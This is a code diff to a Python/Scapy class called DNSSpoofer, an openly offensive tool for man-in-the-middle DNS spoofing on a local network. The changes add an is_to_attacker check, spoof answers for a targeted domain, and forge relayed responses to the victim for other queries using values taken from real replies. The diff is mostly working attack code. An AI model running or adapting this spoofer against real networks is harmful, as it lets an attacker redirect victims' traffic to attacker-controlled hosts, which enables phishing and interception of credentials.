@@ -19,7 +19,8 @@ class DNSSpoofer:
         self.target_domain = target_domain
         self.new_dns_ip = new_dns_ip if new_dns_ip else get_if_addr(interface)
         self.new_dns_ip6 = new_dns_ip6 if new_dns_ip6 else get_if_addr6(interface)
-    
+
+
     def isSupportedType(self, id: int) -> bool:
         return (
             (id == 1 and self.new_dns_ip) or    # A
@@ -50,7 +51,7 @@ class DNSSpoofer:
     def isIncoming(self, pkt: Packet) -> bool:
         """Filter to check, whether a packet is (supposedly) incoming, and not from this interface"""
         if Ether in pkt:
-            return pkt[Ether].src != get_if_hwaddr(self.interface)
+            return pkt[Ether].src == get_if_hwaddr(self.interface)
         else:
             return False
     
@@ -74,6 +75,12 @@ class DNSSpoofer:
                     return True
             
         return False
+    
+    def is_to_attacker(self, pkt: Packet) -> bool:
+        if IP in pkt:
+            return pkt[IP].dst == get_if_addr(self.interface)
+        else:
+            return False
 
     def get_spoof_packet(self, req_pkt: Packet, name: str, recordType: str) -> Packet:
         """Generate one spoofed DNS response packet in response to a particular request"""
@@ -109,26 +116,44 @@ class DNSSpoofer:
                     print('Type not supported, ignoring...')
 
     def handle_dns_packet(self, pkt: Packet) -> None:
-        if self.isFromTarget(pkt) and self.isTargetDomain(pkt):
+        if self.isFromTarget(pkt) and self.isTargetDomain(pkt) and not self.is_to_attacker(pkt):
             # Is from targeted machine, and is a request for targeted domain
+            print(f'Spoof DNS request for: {str(pkt[DNSQR].qname)}, to {pkt[IP].dst}, from {pkt[IP].src}')
             self.spoof_dns_request(pkt)
-        else:
+        elif not int(pkt[DNS].ancount) > 0 and not self.isIncoming(pkt):
             # Any other DNS request, get the real response from Google first
-            #real_res = sr1(
-            #    IP(dst='8.8.8.8') /
-            #    UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport) /
-            #    DNS()
-            #    )
-
-            forward_pkt: Packet = (
-                IP(src=pkt[IP].src, dst=pkt[IP].dst) /
-                UDP(sport=pkt[IP].sport, dport=pkt[IP].dport) /
+            print(f'Forward DNS request for: {str(pkt[DNSQR].qname)}, to {pkt[IP].dst}, from {pkt[IP].src}')
+            spoofed_req: Packet = (
+                IP(dst=pkt[IP].dst) /
+                UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport) /
                 DNS()
             )
 
-            forward_pkt[DNS] = pkt[DNS]
-            print(forward_pkt)
-            send(forward_pkt, iface=self.interface, verbose=True)
+            #spoofed_req[DNS].rd = 1
+            #spoofed_req[DNS].id = pkt[DNS].id
+            #spoofed_req[DNS].qd = DNSQR(qname=pkt[DNSQR].qname)
+            spoofed_req[DNS] = pkt[DNS]
+
+            real_res: Packet = sr1(spoofed_req, inter=1, retry=3, timeout=1)
+
+            if real_res and DNS in real_res:
+                spoofed_res: Packet = (
+                    IP(dst=pkt[IP].src, src=real_res[IP].src) /
+                    UDP(dport=pkt[UDP].sport) /
+                    DNS()
+                )
+
+                spoofed_res[DNS] = real_res[DNS]
+
+                #forward_pkt: Packet = (
+                #    IP(src=pkt[IP].src, dst=pkt[IP].dst) /
+                #    UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport) /
+                #    DNS()
+                #)
+
+                #forward_pkt[DNS] = pkt[DNS]
+                #print(forward_pkt)
+                send(spoofed_res, iface=self.interface, verbose=True)
 
     def set_packet_forwarding(self, value: bool) -> None:
         """This function turns on or turns off IP (packet) forwarding depending on the value given"""
